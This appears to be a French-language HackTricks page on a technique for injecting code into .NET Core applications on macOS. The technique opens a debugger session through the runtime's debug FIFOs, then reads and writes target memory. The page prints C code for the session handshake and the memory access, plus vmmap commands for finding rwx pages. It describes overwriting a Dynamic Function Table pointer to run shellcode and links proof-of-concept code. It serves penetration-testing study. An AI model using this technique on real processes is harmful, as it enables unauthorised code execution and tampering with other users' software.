## Injection d'applications .Net sur macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Débogage .NET Core <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Établir une session de débogage** <a href="#net-core-debugging" id="net-core-debugging"></a>

[**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) est responsable de la gestion de la **communication** entre le débogueur et le débogueur.\
Il crée 2 noms de tuyaux par processus .Net dans [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127) en appelant [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) (l'un se terminera par **`-in`** et l'autre par **`-out`** et le reste du nom sera identique).

Ainsi, si vous allez dans le répertoire **`$TMPDIR`** de l'utilisateur, vous pourrez trouver des **fifos de débogage** que vous pourriez utiliser pour déboguer des applications .Net :

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

La fonction [**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) gérera la communication à partir d'un débogueur.

La première chose qu'un débogueur doit faire est de **créer une nouvelle session de débogage**. Cela se fait en **envoyant un message via le tuyau `out`** commençant par une structure `MessageHeader`, que nous pouvons récupérer à partir de la source .NET :
```c
struct MessageHeader
{
MessageType   m_eType;        // Type of message this is
DWORD         m_cbDataBlock;  // Size of data block that immediately follows this header (can be zero)
DWORD         m_dwId;         // Message ID assigned by the sender of this message
DWORD         m_dwReplyId;    // Message ID that this is a reply to (used by messages such as MT_GetDCB)
DWORD         m_dwLastSeenId; // Message ID last seen by sender (receiver can discard up to here from send queue)
DWORD         m_dwReserved;   // Reserved for future expansion (must be initialized to zero and
// never read)
union {
struct {
DWORD         m_dwMajorVersion;   // Protocol version requested/accepted
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;

BYTE                    m_sMustBeZero[8];
}
```
En cas de demande de nouvelle session, cette structure est remplie comme suit:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Set the message type (in this case, we're establishing a session)
sSendHeader.m_eType = MT_SessionRequest;

// Set the version
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;

// Finally set the number of bytes which follow this header
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
Une fois construit, nous **l'envoyons à la cible** en utilisant l'appel système `write`:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
```
Suivant notre en-tête, nous devons envoyer une structure `sessionRequestData`, qui contient un GUID pour identifier notre session :
```c
// All '9' is a GUID.. right??
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));

// Send over the session request data
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
Après avoir envoyé notre demande de session, nous **lisons à partir du tuyau `out` un en-tête** qui indiquera **si** notre demande d'établissement d'une session de débogage a été **réussie** ou non :
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
### Lire la mémoire

Avec une session de débogage établie, il est possible de **lire la mémoire** en utilisant le type de message [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896). Pour lire une partie de la mémoire, le code principal nécessaire serait :
```c
bool readMemory(void *addr, int len, unsigned char **output) {

*output = (unsigned char *)malloc(len);
if (*output == NULL) {
return false;
}

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_ReadMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to read from
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = 0;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Make sure that memory could be read before we attempt to read further
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

memset(*output, 0, len);

// Read the memory from the debugee
if (read(rd, *output, sReceiveHeader.m_cbDataBlock) < 0) {
return false;
}

return true;
}
```
Le code de preuve de concept (POC) se trouve [ici](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).

### Écrire dans la mémoire
```c
bool writeMemory(void *addr, int len, unsigned char *input) {

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_WriteMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to write to
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = len;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Write the data
if (write(wr, input, len) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Ensure our memory write was successful
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

return true;

}
```
Le code POC utilisé pour cela peut être trouvé [ici](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).

### Exécution de code .NET Core <a href="#net-core-code-execution" id="net-core-code-execution"></a>

La première chose à faire est d'identifier, par exemple, une région de mémoire avec **`rwx`** en cours d'exécution pour enregistrer le shellcode à exécuter. Cela peut être facilement fait avec :
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
Ensuite, afin de déclencher l'exécution, il serait nécessaire de connaître un endroit où un pointeur de fonction est stocké pour l'écraser. Il est possible d'écraser un pointeur dans la **Table de Fonctions Dynamiques (TFD)**, qui est utilisée par le runtime .NET Core pour fournir des fonctions d'aide à la compilation JIT. Une liste de pointeurs de fonction pris en charge peut être trouvée dans [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h).

Dans les versions x64, cela est simple en utilisant la technique de **recherche de signature** similaire à celle de mimikatz pour rechercher dans **`libcorclr.dll`** une référence au symbole **`_hlpDynamicFuncTable`**, que nous pouvons déréférencer :

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Il ne reste plus qu'à trouver une adresse à partir de laquelle commencer notre recherche de signature. Pour ce faire, nous exploitons une autre fonction de débogage exposée, **`MT_GetDCB`**. Cela renvoie un certain nombre d'informations utiles sur le processus cible, mais dans notre cas, nous sommes intéressés par un champ renvoyé contenant l'**adresse d'une fonction d'aide**, **`m_helperRemoteStartAddr`**. En utilisant cette adresse, nous savons exactement **où `libcorclr.dll` est situé** dans la mémoire du processus cible et nous pouvons commencer notre recherche de la TFD.

En connaissant cette adresse, il est possible d'écraser le pointeur de fonction avec notre propre shellcode.

Le code POC complet utilisé pour l'injection dans PowerShell peut être trouvé [ici](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).

## Références

* Cette technique a été prise sur [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
